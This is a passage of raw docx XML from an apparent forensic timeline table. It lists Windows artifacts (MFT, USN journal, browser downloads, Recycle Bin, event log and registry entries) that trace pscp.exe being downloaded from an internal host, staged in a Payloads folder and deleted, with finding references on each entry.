              </w:rPr>
              <w:t>F-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.835711</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115196</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014, I-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.835711</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe:Zone.Identifier</w:t>
              <w:br/>
              <w:t xml:space="preserve">size=102 Zone.Identifier: [ZoneTransfer] ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115197</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014, F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI modification (M)</w:t>
              <w:br/>
              <w:t>C:\Payloads\pscp.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115203</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003, F-008, F-018, I-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI modification (M)</w:t>
              <w:br/>
              <w:t>C:\Payloads\pscp.exe:Zone.Identifier</w:t>
              <w:br/>
              <w:t xml:space="preserve">size=102 Zone.Identifier: [ZoneTransfer] ZoneId=3 ReferrerUrl=http://10.0.0.12:8080/ HostUrl=http://10.0.0.12:8080/pscp.exe </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#115204</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003, F-008, F-014, F-016, I-004, I-015, T-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.851269</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=85774-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87237</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.882523</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (downloads, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>download: ts_end</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>url=http://10.0.0.12:8080/pscp.exe | browser=iexplore</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.downloads.jsonl#6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016, T-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.882523</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Internet Explorer / WebCache (downloads)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>download: ts_end</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>url=http://10.0.0.12:8080/pscp.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/iexplore.downloads.jsonl#3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:10.116914</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Payloads\pscp.exe</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=85781-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87279</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014, T-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Recycle Bin ($I)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Deletion (moved to Recycle Bin)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>size=986624 $I</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>rbcmd/recyclebin_0.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$IHOVDEL.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014, I-013, T-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:20.820023</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$RHOVDEL.exe</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=85774-1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87301</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014, T-013</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:21:41.003421</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Payloads\test.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#109630</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-009, F-018, I-006, I-007, T-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:25:51.789054</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Firewall With Advanced Security/Firewall 2004 | Microsoft-Windows-Windows Firewall With Advanced Security | A rule has been added to the Windows Defender Firewall exception list | : Firefox (C:\Program Files\Mozilla Firefox) | C:\Program Files\Mozilla Firefox\firefox.exe | Direction: Inbound | Action: Allow | Protocol: TCP | *: *</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#24271</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:28:22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Recycle Bin ($I)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Deletion (moved to Recycle Bin)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\sysmon-config.xml</w:t>
              <w:br/>
              <w:t>size=0 $I</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>rbcmd/recyclebin_0.csv#3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Recycle.Bin\S-1-5-21-1841083384-974204330-411256071-1001\$IY8CUX9.xml</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-018</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:41:53.368481</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: last logoff</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson</w:t>
              <w:br/>
              <w:t>S-1-5-21-1841083384-974204330-411256071-1001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_ProfileList.csv#4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:41:53.837229</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
